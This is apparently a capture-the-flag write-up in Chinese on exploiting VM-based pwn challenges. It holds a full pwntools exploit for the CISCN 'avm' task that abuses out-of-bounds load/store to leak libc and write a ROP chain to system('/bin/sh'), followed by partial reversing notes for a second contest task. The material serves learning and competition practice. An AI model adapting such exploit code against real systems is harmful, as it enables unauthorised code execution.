---
title: vmpwn从入门到精通
url: https://forum.butian.net/share/4363
source: 奇安信攻防社区
date: 2025-06-05
fetch_date: 2025-10-06T22:47:49.464348
---

# vmpwn从入门到精通

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### vmpwn从入门到精通

vmpwn从入门到精通

前言
==
[参考博客1](https://blog.xmcve.com/2022/04/11/VMpwn%E6%80%BB%E7%BB%93/#title-5)
[参考博客2](https://xz.aliyun.com/t/7787?time\_\_1311=n4%2BxnD0G0%3DIxBDRhDBqrodK0Ki%3D1w%3D4GObeD&alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-2)
- 有时候可以逆向出结构体
- vmpwn难度在于逆向，逆向结束后一般都是会有整数溢出进行任意地址读写或者是个堆题，七分逆向三分猜，多练习才是重点
- 一般vmpwn逆向结束后就是简单的pwn题技巧叠加，不会有太大难度。要综合性地考虑各种知识：整数溢出、格式化字符串漏洞、栈溢出、堆溢出，不要局限在某个方面，不然都很难解题
- 我们现在常见到的VMPwn基本设计如下：
1. 分配内存模拟程序执行，基本组成要素为代码区和数据区，这两块区域可以分配在同一块内存或者两块独立内存。
2. 数据区域包含模拟栈和模拟寄存器。
3. 代码区根据用户指令模拟各种操作，如压栈出栈，寄存器立即数运算等。一般都是数据区的读写越界引发的漏洞，根据数据区内存分配位置的不同可以分为栈越界，bss越界和堆越界三类问题。
CCBCISCN初赛avm
=============
逆向分析
----
逆向出来的结构体如图所示，结构还比较清楚，这里vm实现的是32个寄存器
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-a2ca9d43bcbc802f1a646d9a3a8dcbe02d6759d1.png)
main函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-2cf36e449c6e2edddf1299d9d38b4c79481aa5f7.png)
vmRun函数，根据code来处理，然后执行func\\_list中的函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-7697091eac953a543d3ed9035e761b5cfc32444b.png)
实现的vm指令如下图所示，这里的add,sub,mul,div,xor,and,shr,shl这些都没有什么问题，\*\*漏洞出在load和store指令\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-896ada6f50f3963988245eca0bacf0cb8d429dc4.png)
漏洞分析
----
store指令
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-8ab7f4393e038fce9fd576ded6d3ac02b26c22cc.png)
load指令
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-7dc4dbdf4a4e81416dd916f5dde02cf97719ae06.png)
- 主要漏洞在于store和load指令检查时只检查a1-&gt;reg\[(v3 » 5) &amp; 0x1F\] + BYTE2(v3),执行指令时却是a1-&gt;reg\[(v3 » 5) &amp; 0x1F\] + (HIWORD(v3) &amp; 0xFFF) + a2，所以可以越界读写虚拟机的缓冲区s。于是可以通过load栈上残留获取libc地址，再经过计算构造rop链，通过store越界写到栈上返回地址处。
```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import \*
from ctypes import \*
context(os='linux', arch='amd64', log\_level='debug')
p = process("/home/zp9080/PWN/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b \*$rebase(0x1A8F7)')
# p=remote('47.94.206.103',30756)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc
def dbg():
gdb.attach(p,'b \*$rebase(0x1A68)')
pause()
#flag{d8523209-6c45-4350-b174-baf2149c9486}
pay=b''
def add(dst,src1,src2):
global pay
tmp=''
tmp+=bin(1)[2:].zfill(4)+bin(src2)[2:].zfill(12)+'0'\*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5)
tmp=int(tmp,2)
pay+=p32(tmp)
def sub(dst,src1,src2):
global pay
tmp=''
tmp+=bin(2)[2:].zfill(4)+bin(src2)[2:].zfill(12)+'0'\*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5)
tmp=int(tmp,2)
pay+=p32(tmp)
def shl(dst,src1,src2):
global pay
tmp=''
tmp+=bin(7)[2:].zfill(4)+bin(src2)[2:].zfill(12)+'0'\*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5)
tmp=int(tmp,2)
pay+=p32(tmp)
def shr(dst,src1,src2):
global pay
tmp=''
tmp+=bin(8)[2:].zfill(4)+bin(src2)[2:].zfill(12)+'0'\*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5)
tmp=int(tmp,2)
pay+=p32(tmp)
def load(dst,src1,src2):
global pay
tmp=''
tmp+=bin(10)[2:].zfill(4)+bin(src2)[2:].zfill(12)+'0'\*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5)
tmp=int(tmp,2)
pay+=p32(tmp)
def store(dst,src1,src2):
global pay
tmp=''
tmp+=bin(9)[2:].zfill(4)+bin(src2)[2:].zfill(12)+'0'\*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5)
tmp=int(tmp,2)
pay+=p32(tmp)
def quit(dst,src1,src2):
global pay
tmp=''
tmp+=bin(11)[2:].zfill(4)+bin(src2)[2:].zfill(12)+'0'\*6+bin(src1)[2:].zfill(5)+bin(dst)[2:].zfill(5)
tmp=int(tmp,2)
pay+=p32(tmp)
def func(value,reg):
off=format(value, '032b')
for i in range(len(off)):
if(i==(len(off)-1)):
if(off[i]=='0'):
pass
elif(off[i]=='1'):
add(reg,reg,13)
break
if(off[i]=='0'):
shl(reg,reg,13)
elif(off[i]=='1'):
add(reg,reg,13)
shl(reg,reg,13)
load(12,0,0xdd8) #reg[12]=libc+off
load(13,0,0x0003d8) #reg[13]=1
# dbg()
func(0x029e40,14)
sub(12,12,14) #reg[12]=libcbase
add(15,12,15)
add(16,12,16)
add(17,12,17)
add(18,12,18)
add(19,12,19)
#pop\_rdi
func(0x2a745,25)
add(15,15,25)
#binsh
bin\_addr = 0x1D8678
func(bin\_addr,26)
add(16,16,26)
# #ret
# func(0x29139,27)
# add(17,17,27)
#system
system\_addr = 0x50D70
func(system\_addr,28)
add(18,18,28)
store(15,31,0x118)
store(16,31,0x118+8)
store(18,31,0x118+0x18)
# dbg()
quit(0,0,0)
pay+=p32(1)
pay=pay.ljust(0x300,b'\x00')
p.sendafter('opcode',pay)
p.interactive()
```
- 由于没有自增，而且本地和远程偏移不同，寄存器初始值都是0， 获取数字1比较困难。最后通过在opcode中自己加入一个1的方式获取，这样的偏移肯定是固定的。
- 而libc地址的偏移也很奇怪，我试了多个本地能通过的偏移，远程都不行。最后获取栈上最远处的\\_\\_libc\\_start\\_main中的返回地址，终于打通了远程。（要记住千万不要用栈上的ld偏移，本地能通的远程基本都不行，最好是用libc附近的值不要用ld附近的值）
最后打通
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-74e763e282337bd070928bb7014996530322d2ad.png)
2025全国大学生软件创新大赛软件系统安全赛vm
========================
libc2.35 保护全开
逆向分析
----
main函数，附件中还有vmdata,vmcode这两个文件，这两个文件是用来初始化vm要执行的代码以及要打印的字符串
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-bed38c477162b25af9019fc171df2b90252d3da2.png)
readfile函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-7db50b06f2bb17ca9f1748f0b3a8c6fec503d77e.png)
handle函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-1f591a5e7d3fceffd80bf1fe395d918df8a7ca15.png)
逆向出来的结构体，\*\*这里的uk7,uk8应该是和栈有关，但是我做题时候没用到，也就没有进一步逆向了\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-68a2dcee9698f1254637487c6bcac7b4a807acaa.png)
handleOp函数，注意下面3个语句,这个&amp;3，说明是取出这个字节的低2位，然后用作为op来进行switch-case的选择。\*\*整个函数的作用就是处理code段的代码，然后将相应的参数赋值给s这个缓冲区，再到handle函数中来执行，但要注意每个处理的方式不同因此特别处理。（比如op=0的时候有个for循环，但是实际上我们可以让前两个字节的数都为0，这样移位等于没有，因此只管最后一次循环的值即可）\*\*
```text
s->a1 = \*code;
s->a2 = s->a1 & 3;
op = (unsigned \_\_int8)s->a2;
```
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-96c3b086b02901722c4732665f368480081c960d.png)
外面的OP0,OP1,OP2,OP3各有各的作用，它这个vm给的非常全，几乎覆盖了我能想到的所有指令。\*\*以OP0为例子.这里的switch-case是根据a2-&gt;a1 » 2来决定的，其实也就是一个字节的高6位，所以当时过了两个多小时还没有解，出题人给了个四大四小的提示，其实就是对应这个题目的一个自己的高6位和低2位，但当时已经逆向完了\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-9ab5432ac122604886ac232dff9a37d32c8144fc.png)
\*\*最终逆向出来转换成脚本如下\*\*
```python
pay=b''
def op0(op,arg1):
global pay
op=op<<2
pay+=p8(op)+b'\x00'\*2+p8(arg1)
def op1(op,arg1):
global pay
op=op<<2
pay+=p8(op|1)+p8(arg1)
def op2(op,arg1,arg2):
global pay
op=op<<2
pay+=p8(op|2)+p8(arg1)+p8(arg2)
def op3(op,arg1,arg2):
global pay
op=op<<2
pay+=p8(op|3)+p8(arg1)+p8(arg2)+b'\x00'\*8
```
VM攻击分析
------
VM一般会有如下几种攻击方式：
```text
1.index越界，这是最常见的情况,一般都是reg\_idx检查不严格，或者漏掉了某个idx的检查，要注意留意，目前还没遇到过stack的rsp越界的情况。有了这种越界一般就可以利用越界得到libcbase，然后最终getshell或者orw
2.任意地址读写，因为可以对寄存器进行赋值，有时候一些指令又根据寄存器来进行读写，因此会有任意地址读写
3.vm中没有越界，但是根据opcode执行的函数有漏洞，比如此题就有个堆的uaf漏洞
```
可以看到OP0中有heapOperate这个函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-09fb22c3a1f80681ee3375ea253c829f5ad06e29.png)
\*\*OP0函数里面就是heap的常见操作add,delete,exit，同时case0的read只能往code段或者data段读入数据，case1的write函数只能打印data段的数据\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-b32ecebb2d299a1093a27a3c3a2dbd1fdb211d63.png)
\*\*func1函数....